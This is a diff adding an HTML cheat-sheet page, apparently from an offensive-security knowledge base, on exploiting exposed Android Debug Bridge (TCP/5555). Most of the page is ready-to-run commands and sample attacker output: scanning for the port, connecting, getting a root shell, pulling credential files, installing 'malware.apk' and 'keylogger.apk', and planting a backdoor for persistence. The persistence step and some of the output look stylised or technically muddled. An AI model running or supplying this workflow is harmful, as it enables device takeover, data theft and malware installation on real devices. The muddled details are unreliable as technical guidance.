@@ -1,0 +1,188 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">ADB (Android Debug Bridge) Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Mobile & IoT Security</strong> • Focus: <strong>ADB Remote Shell Abuse</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    ADB (Android Debug Bridge, TCP/5555) is a tool used for debugging Android devices. 
+    When left exposed over the network, it often requires no authentication, giving 
+    attackers direct root shell access. Exploitation includes device takeover, data 
+    exfiltration, malware installation, and lateral movement in IoT ecosystems. 
+    Misconfigured ADB endpoints have been widely abused in botnets and cryptojacking 
+    campaigns. In Red Team ops, ADB exploitation provides a stealthy way to persist 
+    inside compromised environments.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>No Authentication:</strong> Exposed ADB allows shell access without credentials.</li>
+    <li><strong>Default Root Access:</strong> Many IoT/Android devices run ADB as root.</li>
+    <li><strong>Remote File System Access:</strong> Attackers can push/pull arbitrary files.</li>
+    <li><strong>Malware Deployment:</strong> APKs can be installed silently via ADB.</li>
+    <li><strong>Persistence:</strong> Attackers can leave backdoors or scripts for re-entry.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Scan for open TCP/5555 services.</li>
+    <li><strong>Connection:</strong> Use adb client to connect to the device.</li>
+    <li><strong>Shell Access:</strong> Gain root shell via adb shell.</li>
+    <li><strong>Exploitation:</strong> Pull sensitive data, install malware, or maintain persistence.</li>
+    <li><strong>Impact:</strong> Full compromise of Android/IoT devices.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan network for ADB service on TCP/5555.</li>
+    <li>Connect using adb client.</li>
+    <li>Spawn a remote shell.</li>
+    <li>Exfiltrate sensitive files or dump data.</li>
+    <li>Install malicious APKs or drop persistence scripts.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p5555 -sV [target]                   # Scan for ADB
+adb devices -l                             # List devices connected
+
+# ------------------------------
+# Connect to Device
+# ------------------------------
+adb connect [target]:5555
+adb devices -l
+
+# ------------------------------
+# Remote Shell Access
+# ------------------------------
+adb -s [target]:5555 shell
+id
+whoami
+
+# ------------------------------
+# File Transfer
+# ------------------------------
+adb -s [target]:5555 pull /sdcard/DCIM/data.jpg
+adb -s [target]:5555 push backdoor.sh /data/local/tmp/
+
+# ------------------------------
+# Install Malicious APK
+# ------------------------------
+adb -s [target]:5555 install malware.apk
+
+# ------------------------------
+# Persistence
+# ------------------------------
+adb -s [target]:5555 shell 'echo "adb shell" >> /etc/init.d/startup.sh'
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p5555 -sV 192.168.1.100
+adb connect 192.168.1.100:5555
+adb shell
+id
+adb pull /sdcard/Documents/credentials.txt
+adb install keylogger.apk
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p5555 -sV 192.168.1.100
+PORT     STATE SERVICE VERSION
+5555/tcp open  adb     Android Debug Bridge device
+
+[ saide ~ ]$ adb connect 192.168.1.100:5555
+connected to 192.168.1.100:5555
+
+[ saide ~ ]$ adb -s 192.168.1.100:5555 shell
+shell@android:/ $ id
+uid=0(root) gid=0(root)
+
+[ saide ~ ]$ adb pull /sdcard/Documents/secret.txt
+[+] Downloaded secret.txt (contains credentials)
+
+[ saide ~ ]$ adb install payload.apk
+Success
+
+[ saide ~ ]$ adb shell 'echo "adb shell" >> /data/local/tmp/.backdoor.sh'
+[+] Persistence added
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample ADB exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+5555/tcp open  adb     Android Debug Bridge device
+
+# Remote Shell
+uid=0(root) gid=0(root)
+
+# File Exfiltration
+/sdcard/Documents/secret.txt → contains Gmail + VPN creds
+
+# Malicious APK
+payload.apk installed successfully
+
+# Persistence
+Backdoor script stored in /data/local/tmp/.backdoor.sh
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-adb" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting ADB
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1575/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Native API: Android Debug Bridge
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Connect → Shell → Exfil → APK deploy → Persistence.</li>
+  </ul>
+</section>
